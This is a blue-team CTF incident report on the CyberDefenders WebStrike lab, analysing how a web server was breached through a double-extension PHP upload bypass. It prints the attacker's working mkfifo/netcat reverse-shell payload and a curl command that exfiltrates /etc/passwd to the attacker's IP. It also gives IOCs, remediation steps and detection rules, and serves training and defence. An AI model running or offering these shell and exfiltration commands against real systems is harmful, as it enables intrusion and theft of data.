# Incident Report — WebStrike Lab
**Platform:** CyberDefenders Blue Team CTF  
**Lab:** WebStrike (SOC Analyst Tier 1 — Level 1)  
**Category:** Network Forensics  
**Difficulty:** Easy  
**Tool Used:** Wireshark  
**Date Analyzed:** 2024-11-30  
**Analyst:** [Your Name]

---

## 1. Executive Summary

A company web server at `shoporoma.com` was compromised by an external attacker from IP `117.11.88.124`. The attacker uploaded a malicious PHP web shell disguised as an image file (`image.jpg.php`), successfully bypassing the server's file upload filter. Once uploaded, the web shell was triggered via a GET request, establishing a reverse shell connection back to the attacker on port `8080`. The attacker then conducted system reconnaissance and exfiltrated the server's `/etc/passwd` file to their own machine over port `443`.

---

## 2. Incident Timeline

| Time (UTC) | Event |
|---|---|
| 18:43:35 | Attacker begins reconnaissance — browsing `/reviews/`, `/admin/`, `/uploads/` |
| 18:43:57 | **First upload attempt** — `image.php` blocked → server responds: `"Invalid file format"` |
| 18:44:19 | **Second upload attempt** — `image.jpg.php` succeeds → server responds: `"File uploaded successfully"` |
| 18:44:xx | Attacker sends GET request to `/reviews/uploads/image.jpg.php` — **reverse shell triggered** |
| 18:44:xx | Reverse shell connects back to attacker on port `8080` — C2 session established |
| 18:44:xx | Attacker runs `whoami`, `uname -a`, `pwd`, `ls /home`, `cat /etc/passwd` |
| 18:44:xx | **Data exfiltration** — `/etc/passwd` sent via `curl POST` to `117.11.88.124:443` |

---

## 3. Attack Analysis

### 3.1 MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
|---|---|---|
| **Reconnaissance** | T1595 — Active Scanning | Probed directories: `/admin/`, `/uploads/`, `/reviews/` |
| **Initial Access** | T1190 — Exploit Public-Facing Application | Exploited insecure file upload on `/reviews/upload.php` |
| **Execution** | T1059.004 — Unix Shell | PHP web shell executed reverse shell command |
| **Persistence** | T1505.003 — Web Shell | `image.jpg.php` planted in `/var/www/html/reviews/uploads/` |
| **Command & Control** | T1071.001 — Web Protocols | Reverse shell over TCP port `8080` using Netcat |
| **Discovery** | T1033 — System Owner Discovery | `whoami`, `uname -a`, `ls /home`, `cat /etc/passwd` |
| **Exfiltration** | T1041 — Exfiltration Over C2 Channel | `curl -X POST /etc/passwd` to attacker server on port `443` |

---

### 3.2 Web Shell Upload — File Upload Bypass

The attacker exploited a weak file upload filter on `/reviews/upload.php`.

**First attempt (blocked):**
```
POST /reviews/upload.php
filename: image.php
Content-Type: application/x-php
Response: "Invalid file format"
```

**Second attempt (successful — double extension bypass):**
```
POST /reviews/upload.php
filename: image.jpg.php
Content-Type: application/x-php
Response: "File uploaded successfully"
```

The server's filter checked if the filename *contained* an image extension (`.jpg`) but failed to validate the **final extension** (`.php`). Apache executed the file as PHP because the last extension determines how the file is processed.

---

### 3.3 Web Shell Payload

The uploaded file contained the following reverse shell payload:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

**Payload breakdown:**

| Component | Purpose |
|---|---|
| `rm /tmp/f` | Clean up any existing pipe file |
| `mkfifo /tmp/f` | Create a named pipe for two-way communication |
| `cat /tmp/f \| /bin/sh -i` | Feed incoming data into an interactive shell |
| `2>&1` | Redirect stderr to stdout (attacker sees errors too) |
| `nc 117.11.88.124 8080` | Netcat connects back to attacker on port 8080 |
| `>/tmp/f` | Loop output back through the pipe |

This is a classic **mkfifo reverse shell** — it creates a bidirectional communication channel that originates *from the victim server*, bypassing inbound firewall rules.

---

### 3.4 Post-Exploitation Commands

After establishing the reverse shell, the attacker ran the following commands:

```bash
$ whoami
www-data

$ uname -a
Linux ubuntu-virtual-machine 6.2.0-37-generic #38~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 2 18:01:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

$ pwd
/var/www/html/reviews/uploads

$ ls /home
ubuntu

$ cat /etc/passwd
[full contents of /etc/passwd dumped]
```

**Analyst Notes:**
- Attacker was running as `www-data` (Apache web server user) — limited privileges but sufficient for exfiltration
- OS fingerprinting via `uname -a` reveals Ubuntu 22.04 — attacker could use this to find privilege escalation exploits
- Only one user account (`ubuntu`) found in `/home`

---

### 3.5 Data Exfiltration

```bash
$ curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

The attacker exfiltrated `/etc/passwd` using `curl` over port `443`. Port 443 is the standard HTTPS port and is rarely blocked by outbound firewall rules, making it an effective exfiltration channel. Note: this was plain HTTP — the port was used for evasion, not encryption.

---

## 4. Indicators of Compromise (IOCs)

| Type | Value | Description |
|---|---|---|
| **IP Address** | `117.11.88.124` | Attacker IP — source of all malicious traffic |
| **IP Address** | `24.49.63.79` | Victim web server IP |
| **Filename** | `image.jpg.php` | Malicious web shell uploaded to server |
| **File Path** | `/var/www/html/reviews/uploads/image.jpg.php` | Web shell location on disk |
| **URL** | `http://shoporoma.com/reviews/upload.php` | Vulnerable upload endpoint |
| **URL** | `http://shoporoma.com/reviews/uploads/image.jpg.php` | Web shell trigger URL |
| **Port** | `8080` | Reverse shell C2 port |
| **Port** | `443` | Exfiltration port |
| **User-Agent** | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | Attacker's browser UA |
| **File Exfiltrated** | `/etc/passwd` | Linux user account list stolen |

---

## 5. Impact Assessment

| Area | Impact |
|---|---|
| **Confidentiality** | `/etc/passwd` exfiltrated — full user account list exposed |
| **Integrity** | Malicious file planted on web server filesystem |
| **Availability** | Reverse shell gave attacker persistent access to the server |
| **Scope** | Web server process (`www-data`) compromised — lateral movement possible if privilege escalation attempted |

---

## 6. Recommendations

### 6.1 Immediate Actions
- [ ] Remove `image.jpg.php` from `/var/www/html/reviews/uploads/`
- [ ] Block IP `117.11.88.124` at the firewall
- [ ] Rotate all credentials — assume `/etc/shadow` may also be compromised
- [ ] Audit all files in the uploads directory for other web shells
- [ ] Kill any active reverse shell sessions

### 6.2 Remediation
- [ ] **Fix file upload validation** — validate by MIME type and magic bytes, not just filename extension. Reject any file where the final extension is executable (`.php`, `.sh`, `.py`, etc.)
- [ ] **Move uploads outside web root** — store uploaded files in a directory that Apache cannot execute (e.g. `/var/uploads/` instead of `/var/www/html/`)
- [ ] **Disable PHP execution in uploads folder** — add `.htaccess` rule: `php_flag engine off`
- [ ] **Implement outbound firewall rules** — restrict outbound connections from the web server to only necessary ports/IPs
- [ ] **Deploy a Web Application Firewall (WAF)** — to detect and block malicious upload attempts
- [ ] **Enable file integrity monitoring** — alert on new files appearing in the web root

### 6.3 Detection Rules (SOC)
```
Alert if:
- HTTP POST to /upload.php with Content-Type: application/x-php
- New .php file created in /var/www/html/uploads/
- Outbound connection from web server to non-whitelisted IP on port 8080
- curl/wget process spawned by www-data user
```

---

## 7. Tools Used

| Tool | Purpose |
|---|---|
| **Wireshark** | PCAP analysis, HTTP stream inspection, TCP stream following |

---

## 8. References

- [CyberDefenders WebStrike Lab](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)
- [MITRE ATT&CK — Web Shell T1505.003](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE ATT&CK — Exfiltration Over C2 T1041](https://attack.mitre.org/techniques/T1041/)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

*Report generated as part of Blue Team CTF practice. All analysis performed in a controlled lab environment.*
